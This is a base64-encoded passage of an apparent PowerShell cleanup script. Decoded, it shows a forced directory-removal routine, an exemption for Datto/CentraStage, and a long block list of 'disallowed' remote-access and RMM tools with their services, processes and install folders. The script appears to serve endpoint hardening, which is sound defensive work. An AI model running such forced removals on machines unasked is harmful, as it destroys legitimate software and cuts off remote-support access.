IHsgcmV0dXJuIH0KICAgICAgICAgICAgICAgIGlmIChGb3JjZS1SZW1vdmVEaXIgJGQpIHsgJG4u
ZGlyKys7IExvZyAiZGlyX3JlbW92ZWQgJGQiIH0KICAgICAgICAgICAgICAgIGVsc2UgeyAkbi5m
YWlsKys7IExvZyAiZGlyX1JFTU9WRV9GQUlMRUQgJGQiIH0KICAgICAgICAgICAgfQogICAgfQoK
ICAgICMgNS4gZGlzYWxsb3dlZCBSTU0gLyByZW1vdGUtYWNjZXNzIHRvb2xzIChtYXJrZXQgY292
ZXJhZ2UgMjAyNikuCiAgICAjIEtFRVAgZm9yZXZlcjogRGF0dG8vQ2VudHJhU3RhZ2UgKyBTY3Jl
ZW5Db25uZWN0IGtlZXAgRlBzIChoYW5kbGVkIGFib3ZlKS4KICAgICMgTkVWRVIgcHV0IERhdHRv
L0NlbnRyYVN0YWdlL0NhZ1NlcnZpY2UgaW4gdGhpcyBsaXN0LgogICAgZnVuY3Rpb24gSXMtRGF0
dG9LZWVwZXIoW3N0cmluZ10kcykgewogICAgICAgIGlmICgtbm90ICRzKSB7IHJldHVybiAkZmFs
c2UgfQogICAgICAgIHJldHVybiBbYm9vbF0oJHMgLW1hdGNoICcoP2kpRGF0dG98Q2VudHJhU3Rh
Z2V8Q2FnU2VydmljZXxBdXRvdGFza0VuZHBvaW50JykKICAgIH0KICAgICRybW0gPSBAKAogICAg
ICAgIEB7IFRhZz0nQW55RGVzayc7ICAgICAgU3ZjPUAoJ0FueURlc2snKTsgUHJvYz1AKCdBbnlE
ZXNrJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQW55RGVzayIsIiR7ZW52OlByb2dyYW1G
aWxlcyh4ODYpfVxBbnlEZXNrIiwiJGVudjpQcm9ncmFtRGF0YVxBbnlEZXNrIik7IFByb2Q9QCgn
QW55RGVzayonKSB9CiAgICAgICAgQHsgVGFnPSdUZWFtVmlld2VyJzsgICBTdmM9QCgnVGVhbVZp
ZXdlcionKTsgUHJvYz1AKCdUZWFtVmlld2VyKicsJ3R2X3czMionLCd0dl94NjQqJyk7IERpcnM9
QCgiJGVudjpQcm9ncmFtRmlsZXNcVGVhbVZpZXdlciIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYp
fVxUZWFtVmlld2VyIik7IFByb2Q9QCgnVGVhbVZpZXdlcionKSB9CiAgICAgICAgQHsgVGFnPSdT
cGxhc2h0b3AnOyAgICBTdmM9QCgnU3BsYXNodG9wKicsJ1NSU2VydmljZScsJ1NTVVNlcnZpY2Un
KTsgUHJvYz1AKCdTcGxhc2h0b3AqJywnc3Ryd2luY2x0KicsJ1NSTWFuYWdlcionKTsgRGlycz1A
KCIkZW52OlByb2dyYW1GaWxlc1xTcGxhc2h0b3AiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
U3BsYXNodG9wIik7IFByb2Q9QCgnU3BsYXNodG9wKicpIH0KICAgICAgICBAeyBUYWc9J0xvZ01l
SW4nOyAgICAgIFN2Yz1AKCdMb2dNZUluJywnTE1JR3VhcmRpYW5TdmMnLCdMTUlpZ25pdGlvbicp
OyBQcm9jPUAoJ0xvZ01lSW4qJywnTE1JR3VhcmRpYW4qJywnUmFTZXJ2ZXIqJyk7IERpcnM9QCgi
JGVudjpQcm9ncmFtRmlsZXNcTG9nTWVJbiIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxMb2dN
ZUluIik7IFByb2Q9QCgnTG9nTWVJbionKSB9CiAgICAgICAgQHsgVGFnPSdHb1RvJzsgICAgICAg
ICBTdmM9QCgnR29Ub015UEMqJywnR29Ub0Fzc2lzdConLCdHb1RvUmVzb2x2ZSonKTsgUHJvYz1A
KCdHb1RvTXlQQyonLCdHb1RvQXNzaXN0KicsJ2cybSonLCdHb1RvUmVzb2x2ZSonKTsgRGlycz1A
KCIkZW52OlByb2dyYW1GaWxlc1xHb1RvTXlQQyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxH
b1RvTXlQQyIpOyBQcm9kPUAoJ0dvVG9NeVBDKicsJ0dvVG9Bc3Npc3QqJywnR29UbyBSZXNvbHZl
KicsJ0dvVG9NZWV0aW5nKicsJ0dvVG8gQ29ubmVjdConKSB9CiAgICAgICAgQHsgVGFnPSdSdXN0
RGVzayc7ICAgICBTdmM9QCgnUnVzdERlc2snLCdydXN0ZGVzayonKTsgUHJvYz1AKCdydXN0ZGVz
ayonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xSdXN0RGVzayIsIiR7ZW52OlByb2dyYW1G
aWxlcyh4ODYpfVxSdXN0RGVzayIpOyBQcm9kPUAoJ1J1c3REZXNrKicpIH0KICAgICAgICBAeyBU
YWc9J1N1cHJlbW8nOyAgICAgIFN2Yz1AKCdTdXByZW1vKicpOyBQcm9jPUAoJ1N1cHJlbW8qJyk7
IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU3VwcmVtbyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4
ODYpfVxTdXByZW1vIik7IFByb2Q9QCgnU3VwcmVtbyonKSB9CiAgICAgICAgQHsgVGFnPSdEV1Nl
cnZpY2UnOyAgICBTdmM9QCgnRFdBZ2VudCcsJ2R3YWdlbnQqJyk7IFByb2M9QCgnZHdhZ2VudCon
KTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xEV0FnZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVz
KHg4Nil9XERXQWdlbnQiLCIkZW52OlByb2dyYW1EYXRhXERXQWdlbnQiKTsgUHJvZD1AKCdEV0Fn
ZW50KicsJ0RXU2VydmljZSonKSB9CiAgICAgICAgQHsgVGFnPSdab2hvQXNzaXN0JzsgICBTdmM9
QCgnWm9ob0Fzc2lzdConLCdab2hvTWVldGluZyonKTsgUHJvYz1AKCdab2hvQXNzaXN0KicsJ1pv
aG9VUlNCKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFpvaG9NZWV0aW5nIiwiJHtlbnY6
UHJvZ3JhbUZpbGVzKHg4Nil9XFpvaG9NZWV0aW5nIik7IFByb2Q9QCgnWm9obyBBc3Npc3QqJywn
Wm9ob01lZXRpbmcqJykgfQogICAgICAgIEB7IFRhZz0nUmVtb3RlUEMnOyAgICAgU3ZjPUAoJ1Jl
bW90ZVBDKicpOyBQcm9jPUAoJ1JlbW90ZVBDKicsJ1JQQ1N1aXRlKicpOyBEaXJzPUAoIiRlbnY6
UHJvZ3JhbUZpbGVzXFJlbW90ZVBDIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFJlbW90ZVBD
Iik7IFByb2Q9QCgnUmVtb3RlUEMqJykgfQogICAgICAgIEB7IFRhZz0nQm9tZ2FyJzsgICAgICAg
U3ZjPUAoJ2JvbWdhcionLCdCZXlvbmRUcnVzdConKTsgUHJvYz1AKCdib21nYXIqJyk7IERpcnM9
QCgiJGVudjpQcm9ncmFtRmlsZXNcQm9tZ2FyIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEJv
bWdhciIsIiRlbnY6UHJvZ3JhbUZpbGVzXEJleW9uZFRydXN0IiwiJHtlbnY6UHJvZ3JhbUZpbGVz
KHg4Nil9XEJleW9uZFRydXN0Iik7IFByb2Q9QCgnQm9tZ2FyKicsJ0JleW9uZFRydXN0KicpIH0K
ICAgICAgICBAeyBUYWc9J1BhcnNlYyc7ICAgICAgIFN2Yz1AKCdQYXJzZWMqJyk7IFByb2M9QCgn
cGFyc2VjZConLCdwc2VydmljZSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xQYXJzZWMi
LCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUGFyc2VjIiwiJGVudjpQcm9ncmFtRGF0YVxQYXJz
ZWMiKTsgUHJvZD1AKCdQYXJzZWMqJykgfQogICAgICAgIEB7IFRhZz0nQ2hyb21lUkQnOyAgICAg
U3ZjPUAoJ2Nocm9tb3RpbmcqJyk7IFByb2M9QCgncmVtb3RpbmdfaG9zdConKTsgRGlycz1AKCIk
ZW52OlByb2dyYW1GaWxlc1xHb29nbGVcQ2hyb21lIFJlbW90ZSBEZXNrdG9wIiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XEdvb2dsZVxDaHJvbWUgUmVtb3RlIERlc2t0b3AiKTsgUHJvZD1AKCdD
aHJvbWUgUmVtb3RlIERlc2t0b3AqJykgfQogICAgICAgIEB7IFRhZz0nVWx0cmFWTkMnOyAgICAg
U3ZjPUAoJ3V2bmMqJywnd2ludm5jKicpOyBQcm9jPUAoJ3dpbnZuYyonLCd1dm5jKicpOyBEaXJz
PUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFVsdHJhVk5DIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9
XFVsdHJhVk5DIik7IFByb2Q9QCgnVWx0cmFWTkMqJywnV2luVk5DKicpIH0KICAgICAgICBAeyBU
YWc9J1RpZ2h0Vk5DJzsgICAgIFN2Yz1AKCd0dm5zZXJ2ZXIqJyk7IFByb2M9QCgndHZuc2VydmVy
KicsJ3R2bnZpZXdlcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xUaWdodFZOQyIsIiR7
ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxUaWdodFZOQyIpOyBQcm9kPUAoJ1RpZ2h0Vk5DKicpIH0K
ICAgICAgICBAeyBUYWc9J1JlYWxWTkMnOyAgICAgIFN2Yz1AKCd2bmNzZXJ2ZXIqJyk7IFByb2M9
QCgndm5jc2VydmVyKicsJ3ZuY3ZpZXdlcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xS
ZWFsVk5DIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFJlYWxWTkMiKTsgUHJvZD1AKCdWTkMg
U2VydmVyKicsJ1JlYWxWTkMqJykgfQogICAgICAgIEB7IFRhZz0nRGFtZVdhcmUnOyAgICAgU3Zj
PUAoJ0RhbWVXYXJlKicpOyBQcm9jPUAoJ0RXUkNTKicsJ0RXUkNDKicsJ0RhbWVXYXJlKicpOyBE
aXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFNvbGFyV2luZHMiLCIke2VudjpQcm9ncmFtRmlsZXMo
eDg2KX1cU29sYXJXaW5kcyIsIiRlbnY6UHJvZ3JhbUZpbGVzXERhbWVXYXJlIFJlbW90ZSBTdXBw
b3J0IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XERhbWVXYXJlIFJlbW90ZSBTdXBwb3J0Iik7
IFByb2Q9QCgnRGFtZVdhcmUqJykgfQogICAgICAgIEB7IFRhZz0nTmV0U3VwcG9ydCc7ICAgU3Zj
PUAoJ05ldFN1cHBvcnQqJyk7IFByb2M9QCgnY2xpZW50MzIqJywncGNpY3RsKicpOyBEaXJzPUAo
IiRlbnY6UHJvZ3JhbUZpbGVzXE5ldFN1cHBvcnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
TmV0U3VwcG9ydCIpOyBQcm9kPUAoJ05ldFN1cHBvcnQqJykgfQogICAgICAgIEB7IFRhZz0nU2lt
cGxlSGVscCc7ICAgU3ZjPUAoJ1NpbXBsZUhlbHAqJyk7IFByb2M9QCgnU2ltcGxlU2VydmljZSon
LCdzaW1wbGVzZXJ2aWNlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFNpbXBsZUhlbHAi
LCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU2ltcGxlSGVscCIpOyBQcm9kPUAoJ1NpbXBsZUhl
bHAqJykgfQogICAgICAgIEB7IFRhZz0nR2V0U2NyZWVuJzsgICAgU3ZjPUAoJ0dldFNjcmVlbion
KTsgUHJvYz1AKCdHZXRTY3JlZW4qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcR2V0U2Ny
ZWVuIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEdldFNjcmVlbiIpOyBQcm9kPUAoJ0dldFNj
cmVlbionKSB9CiAgICAgICAgQHsgVGFnPSdJcGVyaXVzJzsgICAgICBTdmM9QCgnSXBlcml1cyon
KTsgUHJvYz1AKCdJcGVyaXVzUmVtb3RlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXElw
ZXJpdXMgUmVtb3RlIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XElwZXJpdXMgUmVtb3RlIik7
IFByb2Q9QCgnSXBlcml1cyonKSB9CiAgICAgICAgQHsgVGFnPSdJU0xPbmxpbmUnOyAgIFN2Yz1A
KCdJU0xsaWdodConKTsgUHJvYz1AKCdJU0xsaWdodConLCdJU0xBbHdheXNPbionKTsgRGlycz1A
KCIkZW52OlByb2dyYW1GaWxlc1xJU0wgT25saW5lIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9
XElTTCBPbmxpbmUiKTsgUHJvZD1AKCdJU0wgTGlnaHQqJywnSVNMIEFsd2F5c09uKicpIH0KICAg
ICAgICBAeyBUYWc9J0FtbXl5JzsgICAgICAgIFN2Yz1AKCdBbW15eSonKTsgUHJvYz1AKCdBbW15
eSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBbW15eSIsIiR7ZW52OlByb2dyYW1GaWxl
cyh4ODYpfVxBbW15eSIpOyBQcm9kPUAoJ0FtbXl5KicpIH0KICAgICAgICBAeyBUYWc9J1VsdHJh
Vmlld2VyJzsgIFN2Yz1AKCdVbHRyYVZpZXdlcionKTsgUHJvYz1AKCdVbHRyYVZpZXdlcionKTsg
RGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xVbHRyYVZpZXdlciIsIiR7ZW52OlByb2dyYW1GaWxl
cyh4ODYpfVxVbHRyYVZpZXdlciIpOyBQcm9kPUAoJ1VsdHJhVmlld2VyKicpIH0KICAgICAgICBA
eyBUYWc9J0Flcm9BZG1pbic7ICAgIFN2Yz1AKCdBZXJvQWRtaW4qJyk7IFByb2M9QCgnQWVyb0Fk
bWluKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFlcm9BZG1pbiIsIiR7ZW52OlByb2dy
YW1GaWxlcyh4ODYpfVxBZXJvQWRtaW4iKTsgUHJvZD1AKCdBZXJvQWRtaW4qJykgfQogICAgICAg
IEB7IFRhZz0nTGl0ZU1hbmFnZXInOyAgU3ZjPUAoJ0xpdGVNYW5hZ2VyKicpOyBQcm9jPUAoJ1JP
TVNlcnZlcionLCdST01WaWV3ZXIqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTGl0ZU1h
bmFnZXIiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTGl0ZU1hbmFnZXIiKTsgUHJvZD1AKCdM
aXRlTWFuYWdlcionKSB9CiAgICAgICAgQHsgVGFnPSdSYWRtaW4nOyAgICAgICBTdmM9QCgnUmFk
bWluKicpOyBQcm9jPUAoJ3JzZXJ2ZXIzKicsJ1JhZG1pbionKTsgRGlycz1AKCIkZW52OlByb2dy
YW1GaWxlc1xSYWRtaW4gU2VydmVyIDMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUmFkbWlu
IFNlcnZlciAzIik7IFByb2Q9QCgnUmFkbWluKicpIH0KICAgICAgICBAeyBUYWc9J05vTWFjaGlu
ZSc7ICAgIFN2Yz1AKCdueHNlcnZlcionLCdueGQqJyk7IFByb2M9QCgnbnhkKicsJ254c2VydmVy
KicsJ254cnVubmVyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXE5vTWFjaGluZSIsIiR7
ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxOb01hY2hpbmUiKTsgUHJvZD1AKCdOb01hY2hpbmUqJykg
fQogICAgICAgIEB7IFRhZz0nTmluamFPbmUnOyAgICAgU3ZjPUAoJ05pbmphUk1NQWdlbnQnLCdu
aW5qYXJtbSonLCdOaW5qYVJNTSonKTsgUHJvYz1AKCdOaW5qYVJNTUFnZW50KicsJ25pbmphcm1t
KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXE5pbmphUk1NQWdlbnQiLCIke2VudjpQcm9n
cmFtRmlsZXMoeDg2KX1cTmluamFSTU1BZ2VudCIsIiRlbnY6UHJvZ3JhbURhdGFcTmluamFSTU1B
Z2VudCIsIiRlbnY6UHJvZ3JhbUZpbGVzXE5pbmphT25lIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
Nil9XE5pbmphT25lIik7IFByb2Q9QCgnTmluamFSTU0qJywnTmluamFPbmUqJykgfQogICAgICAg
IEB7IFRhZz0nQXRlcmEnOyAgICAgICAgU3ZjPUAoJ0F0ZXJhQWdlbnQnKTsgUHJvYz1AKCdBdGVy
YUFnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFURVJBIE5ldHdvcmtzIiwiJHtl
bnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFURVJBIE5ldHdvcmtzIiwiJGVudjpQcm9ncmFtRGF0YVxB
VEVSQSBOZXR3b3JrcyIpOyBQcm9kPUAoJ0F0ZXJhKicpIH0KICAgICAgICBAeyBUYWc9J0Nvbm5l
Y3RXaXNlJzsgIFN2Yz1AKCdMVFNlcnZpY2UnLCdMVFN2Y01vbicpOyBQcm9jPUAoJ0xUU3ZjKics
J0xUVHJheSonKTsgRGlycz1AKCIkZW52OndpbmRpclxMVFN2YyIsIiRlbnY6UHJvZ3JhbUZpbGVz
XExhYlRlY2ggQ2xpZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XExhYlRlY2ggQ2xpZW50
Iik7IFByb2Q9QCgnQ29ubmVjdFdpc2UgQXV0b21hdGUqJywnQ29ubmVjdFdpc2UgUk1NKicsJ0xh
YlRlY2gqJykgfQogICAgICAgIEB7IFRhZz0nS2FzZXlhJzsgICAgICAgU3ZjPUAoJ0FnZW50TW9u
JywnS2FzZXlhKicsJ0tBQURTKicpOyBQcm9jPUAoJ0FnZW50TW9uKicsJ0thc2V5YSonKTsgRGly
cz1AKCIkZW52OlByb2dyYW1GaWxlc1xLYXNleWEiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
S2FzZXlhIik7IFByb2Q9QCgnS2FzZXlhIFZTQSonLCdLYXNleWEgQWdlbnQqJykgfQogICAgICAg
IEB7IFRhZz0nTmFibGUnOyAgICAgICAgU3ZjPUAoJ0FkdmFuY2VkIE1vbml0b3JpbmcgQWdlbnQq
JywnTi1hYmxlKicsJ05DZW50cmFsKicpOyBQcm9jPUAoJ0ZpbGVTeXN0ZW1BZ2VudConLCdOQ2Vu
dHJhbConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBZHZhbmNlZCBNb25pdG9yaW5nIEFn
ZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFkdmFuY2VkIE1vbml0b3JpbmcgQWdlbnQi
LCIkZW52OlByb2dyYW1GaWxlc1xOLWFibGUgVGVjaG5vbG9naWVzIiwiJHtlbnY6UHJvZ3JhbUZp
bGVzKHg4Nil9XE4tYWJsZSBUZWNobm9sb2dpZXMiLCIkZW52OlByb2dyYW1GaWxlc1xNU1BBIEZp
bGVzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE1TUEEgRmlsZXMiKTsgUHJvZD1AKCdBZHZh
bmNlZCBNb25pdG9yaW5nIEFnZW50KicsJ04tYWJsZSonLCdOLWNlbnRyYWwqJywnTi1zaWdodCon
LCdUYWtlIENvbnRyb2wqJywnU29sYXJXaW5kcyBNU1AqJykgfQogICAgICAgIEB7IFRhZz0nU3lu
Y3JvJzsgICAgICAgU3ZjPUAoJ1N5bmNybyonLCdLYWJ1dG8qJyk7IFByb2M9QCgnU3luY3JvKics
J0thYnV0byonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xSZXBhaXJUZWNoIiwiJHtlbnY6
UHJvZ3JhbUZpbGVzKHg4Nil9XFJlcGFpclRlY2giLCIkZW52OlByb2dyYW1GaWxlc1xTeW5jcm8i
LCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU3luY3JvIiwiJGVudjpQcm9ncmFtRGF0YVxTeW5j
cm8iKTsgUHJvZD1AKCdTeW5jcm8qJywnS2FidXRvKicsJ1JlcGFpclRlY2gqJykgfQogICAgICAg
IEB7IFRhZz0nUHVsc2V3YXknOyAgICAgU3ZjPUAoJ1B1bHNld2F5KicsJ1BDIE1vbml0b3IqJyk7
IFByb2M9QCgnUENNb25pdG9yTWdyKicsJ1BDTW9uaXRvck1hbmFnZXIqJywnUHVsc2V3YXkqJyk7
IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcUHVsc2V3YXkiLCIke2VudjpQcm9ncmFtRmlsZXMo
eDg2KX1cUHVsc2V3YXkiLCIkZW52OlByb2dyYW1GaWxlc1xQQyBNb25pdG9yIiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XFBDIE1vbml0b3IiKTsgUHJvZD1AKCdQdWxzZXdheSonLCdQQyBNb25p
dG9yKicpIH0KICAgICAgICBAeyBUYWc9J1N1cGVyT3BzJzsgICAgIFN2Yz1AKCdTdXBlck9wcyon
KTsgUHJvYz1AKCdTdXBlck9wcyonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xTdXBlck9w
cyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTdXBlck9wcyIsIiRlbnY6UHJvZ3JhbURhdGFc
U3VwZXJPcHMiKTsgUHJvZD1AKCdTdXBlck9wcyonKSB9CiAgICAgICAgQHsgVGFnPSdMZXZlbCc7
ICAgICAgICBTdmM9QCgnTGV2ZWwqJyk7IFByb2M9QCgnbGV2ZWwqJyk7IERpcnM9QCgiJGVudjpQ
cm9ncmFtRmlsZXNcTGV2ZWwiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTGV2ZWwiLCIkZW52
OlByb2dyYW1EYXRhXExldmVsIik7IFByb2Q9QCgnTGV2ZWwqJykgfQogICAgICAgIEB7IFRhZz0n
QWN0aW9uMSc7ICAgICAgU3ZjPUAoJ0FjdGlvbjEqJyk7IFByb2M9QCgnQWN0aW9uMSonLCdhY3Rp
b24xX2FnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFjdGlvbjEiLCIke2VudjpQ
cm9ncmFtRmlsZXMoeDg2KX1cQWN0aW9uMSIsIiRlbnY6UHJvZ3JhbURhdGFcQWN0aW9uMSIpOyBQ
cm9kPUAoJ0FjdGlvbjEqJykgfQogICAgICAgIEB7IFRhZz0nTWFuYWdlRW5naW5lJzsgU3ZjPUAo
J01hbmFnZUVuZ2luZSonLCdVRU1TKicsJ0RDQWdlbnQqJyk7IFByb2M9QCgnTWFuYWdlRW5naW5l
KicsJ2RjYWdlbnQqJywnVUVNUyonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xNYW5hZ2VF
bmdpbmUiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTWFuYWdlRW5naW5lIik7IFByb2Q9QCgn
TWFuYWdlRW5naW5lKicsJ1VFTVMqJywnRGVza3RvcCBDZW50cmFsKicsJ0VuZHBvaW50IENlbnRy
YWwqJywnUk1NIENlbnRyYWwqJykgfQogICAgICAgIEB7IFRhZz0nVGFjdGljYWxSTU0nOyAgU3Zj
PUAoJ3RhY3RpY2Fscm1tKicsJ01lc2ggQWdlbnQnLCdNZXNoQWdlbnQnKTsgUHJvYz1AKCd0YWN0
aWNhbHJtbSonLCdtZXNoYWdlbnQqJywnTWVzaEFnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3Jh
bUZpbGVzXFRhY3RpY2FsQWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cVGFjdGljYWxB
Z2VudCIsIiRlbnY6UHJvZ3JhbUZpbGVzXE1lc2ggQWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMo
eDg2KX1cTWVzaCBBZ2VudCIpOyBQcm9kPUAoJ1RhY3RpY2FsKicsJ01lc2ggQWdlbnQqJywnTWVz
aENlbnRyYWwqJykgfQogICAgICAgIEB7IFRhZz0nTWVzaENlbnRyYWwnOyAgU3ZjPUAoJ01lc2gg
QWdlbnQnLCdNZXNoQWdlbnQnLCdNZXNoQ2VudHJhbConKTsgUHJvYz1AKCdNZXNoQWdlbnQqJywn
TWVzaENlbnRyYWwqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTWVzaCBBZ2VudCIsIiR7
ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxNZXNoIEFnZW50Iik7IFByb2Q9QCgnTWVzaCpBZ2VudCon
LCdNZXNoQ2VudHJhbConKSB9CiAgICAgICAgQHsgVGFnPSdDb250aW51dW0nOyAgICBTdmM9QCgn
U0FBWionLCdDb250aW51dW0qJyk7IFByb2M9QCgnU0FBWionLCdDb250aW51dW0qJyk7IERpcnM9
QCgiJGVudjpQcm9ncmFtRmlsZXNcU0FBWk9EIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNB
QVpPRCIsIiRlbnY6UHJvZ3JhbUZpbGVzXENvbnRpbnV1bSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4
ODYpfVxDb250aW51dW0iKTsgUHJvZD1AKCdDb250aW51dW0qJywnU0FBWionKSB9CiAgICAgICAg
QHsgVGFnPSdOYXZlcmlzayc7ICAgICBTdmM9QCgnTmF2ZXJpc2sqJyk7IFByb2M9QCgnTmF2ZXJp
c2sqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTmF2ZXJpc2siLCIke2VudjpQcm9ncmFt
RmlsZXMoeDg2KX1cTmF2ZXJpc2siKTsgUHJvZD1AKCdOYXZlcmlzayonKSB9CiAgICAgICAgQHsg
VGFnPSdJbW15Qm90JzsgICAgICBTdmM9QCgnSW1teUJvdConLCdJbW15KicpOyBQcm9jPUAoJ0lt
bXlBZ2VudConLCdJbW15Qm90KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEltbXlCb3Qi
LCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cSW1teUJvdCIsIiRlbnY6UHJvZ3JhbURhdGFcSW1t
eUJvdCIpOyBQcm9kPUAoJ0ltbXlCb3QqJykgfQogICAgICAgIEB7IFRhZz0nQXV0b21veCc7ICAg
ICAgU3ZjPUAoJ2FtYWdlbnQqJywnQXV0b21veConKTsgUHJvYz1AKCdhbWFnZW50KicpOyBEaXJz
PUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEF1dG9tb3giLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
QXV0b21veCIsIiRlbnY6UHJvZ3JhbURhdGFcYW1hZ2VudCIpOyBQcm9kPUAoJ0F1dG9tb3gqJykg
fQogICAgICAgIEB7IFRhZz0nQWNyb25pc0N5YmVyJzsgU3ZjPUAoJ0Fjcm9uaXMqJyk7IFByb2M9
QCgnYWNyb2NtZConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBY3JvbmlzIiwiJHtlbnY6
UHJvZ3JhbUZpbGVzKHg4Nil9XEFjcm9uaXMiKTsgUHJvZD1AKCdBY3JvbmlzIEN5YmVyKicsJ0Fj
cm9uaXMgQWdlbnQqJywnQ3liZXIgUHJvdGVjdCBBZ2VudConKSB9CiAgICAgICAgQHsgVGFnPSdE
b21vdHonOyAgICAgICBTdmM9QCgnRG9tb3R6KicpOyBQcm9jPUAoJ0RvbW90eionKTsgRGlycz1A
KCIkZW52OlByb2dyYW1GaWxlc1xEb21vdHoiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cRG9t
b3R6Iik7IFByb2Q9QCgnRG9tb3R6KicpIH0KICAgICAgICBAeyBUYWc9J0F1dmlrJzsgICAgICAg
IFN2Yz1AKCdBdXZpayonKTsgUHJvYz1AKCdBdXZpayonKTsgRGlycz1AKCIkZW52OlByb2dyYW1G
aWxlc1xBdXZpayIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBdXZpayIpOyBQcm9kPUAoJ0F1
dmlrKicpIH0KICAgICAgICBAeyBUYWc9J0JhcnJhY3VkYVJNTSc7IFN2Yz1AKCdCYXJyYWN1ZGEq
Jyk7IFByb2M9QCgnTVdTZXJ2aWNlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEJhcnJh
Y3VkYSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxCYXJyYWN1ZGEiLCIkZW52OlByb2dyYW1G
aWxlc1xMZXZlbCBQbGF0Zm9ybXMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTGV2ZWwgUGxh
dGZvcm1zIik7IFByb2Q9QCgnQmFycmFjdWRhIFJNTSonLCdNYW5hZ2VkIFdvcmtwbGFjZSonKSB9
CiAgICAgICAgQHsgVGFnPSdHb3Zlcmxhbic7ICAgICBTdmM9QCgnR292ZXJsYW4qJyk7IFByb2M9
QCgnZ292ZXJsYW4qJywnZ292YWdlbnQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcR292
ZXJsYW4iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cR292ZXJsYW4iKTsgUHJvZD1AKCdHb3Zl
cmxhbionKSB9CiAgICAgICAgQHsgVGFnPSdQRFEnOyAgICAgICAgICBTdmM9QCgnUERRKicpOyBQ
